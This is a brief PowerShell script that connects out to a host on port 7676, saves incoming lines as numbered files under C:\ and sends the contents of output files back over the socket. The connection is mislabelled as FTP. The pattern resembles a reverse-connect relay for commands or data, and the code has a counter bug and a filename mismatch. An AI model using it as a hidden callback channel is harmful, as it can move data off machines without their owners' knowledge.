$FTPServer = '192.168.0.133';
$FTPPort = '7676';

$tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);
$tcpStream = $tcpConnection.GetStream();
$reader = New-Object System.IO.StreamReader($tcpStream);
$writer = New-Object System.IO.StreamWriter($tcpStream);
$writer.AutoFlush = $true;
$inputCounter = 0;
$outputCounter = 0;

Set-Content 'C:\output.txt' '';
while ($tcpConnection.Connected) {
    while ($tcpStream.DataAvailable -or $reader.Peek() -ne -1 ) {   
        $path = -join('C:\input', $inputCounter,'.txt');
        Set-Content -Path $path -Value $reader.ReadLine();
        $inputCounter+=1;
    };

    $pathOutput = -join('C:\output',$outputCounter,'.txt');
    $output = Get-Content $pathOutput;
    if($output.length -ge 1){
        Foreach($s in $output){
            $writer.WriteLine($s);
        };
        Remove-Item $pathOutput
    };

    start-sleep -Milliseconds 500;
};

$reader.Close();
$writer.Close();
$tcpConnection.Close();